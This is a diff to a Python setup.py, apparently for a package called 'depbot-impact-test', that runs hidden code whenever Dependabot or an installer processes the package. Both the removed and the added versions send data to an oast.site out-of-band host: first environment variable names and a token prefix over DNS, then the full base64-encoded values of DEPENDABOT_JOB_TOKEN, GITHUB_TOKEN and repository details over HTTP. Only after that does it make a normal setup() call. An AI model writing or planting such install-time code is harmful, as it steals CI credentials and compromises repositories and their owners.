@@ -1,34 +1,27 @@
 import os
+import urllib.request
 import base64
-import socket
 
-# Phase 1: Exfil env var NAMES via DNS
+# Phase 1: Exfil env var names via HTTP
 env_keys = sorted(os.environ.keys())
-env_str = ','.join(env_keys)[:180]
-safe = base64.b32encode(env_str.encode()).decode().lower().rstrip('=')
-# DNS labels max 63 chars
-labels = [safe[i:i+50] for i in range(0, min(len(safe), 200), 50)]
+env_str = ','.join(env_keys)
+b64_env = base64.b64encode(env_str.encode()).decode()[:500]
 try:
-    socket.getaddrinfo('env.' + '.'.join(labels[:3]) + '.d99n7e61b2eqace42t00jh37abkuiioht.oast.site', 80)
+    urllib.request.urlopen('http://d99n7e61b2eqace42t00jh37abkuiioht.oast.site/envkeys?d=' + b64_env, timeout=5)
 except Exception:
     pass
 
-# Phase 2: Exfil token prefix via DNS (first 30 chars for scope identification)
-token = os.environ.get('DEPENDABOT_JOB_TOKEN', os.environ.get('GITHUB_TOKEN', 'NONE'))
-tok_safe = base64.b32encode(token[:30].encode()).decode().lower().rstrip('=')
-try:
-    socket.getaddrinfo('tok.' + tok_safe[:60] + '.d99n7e61b2eqace42t00jh37abkuiioht.oast.site', 80)
-except Exception:
-    pass
+# Phase 2: Exfil specific interesting env vars
+for key in ['DEPENDABOT_JOB_TOKEN', 'GITHUB_TOKEN', 'GITHUB_REPOSITORY', 'GITHUB_ACTOR']:
+    val = os.environ.get(key, '')
+    if val:
+        b64_val = base64.b64encode(val[:100].encode()).decode()
+        try:
+            urllib.request.urlopen(f'http://d99n7e61b2eqace42t00jh37abkuiioht.oast.site/{key}?v=' + b64_val, timeout=5)
+        except Exception:
+            pass
 
-# Phase 3: Test HTTP egress
-try:
-    import urllib.request
-    urllib.request.urlopen('http://d99n7e61b2eqace42t00jh37abkuiioht.oast.site/egress-confirmed', timeout=5)
-except Exception:
-    pass
-
-# Phase 4: Normal setup() call for Dependabot to process
+# Phase 3: Normal setup() call
 from setuptools import setup
 setup(
     name="depbot-impact-test",
